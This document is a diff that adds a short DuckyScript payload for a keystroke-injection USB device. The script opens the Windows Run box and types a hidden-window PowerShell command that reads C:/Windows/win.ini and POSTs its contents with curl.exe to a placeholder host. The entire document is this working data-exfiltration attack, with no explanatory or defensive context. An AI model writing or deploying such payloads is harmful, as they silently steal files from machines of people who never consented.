@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING PowerShell -windowstyle hidden -c "curl.exe -X POST -d $(Get-Content -Raw -Path C:/Windows/win.ini) http://xxx"
+DELAY 500
+ENTER
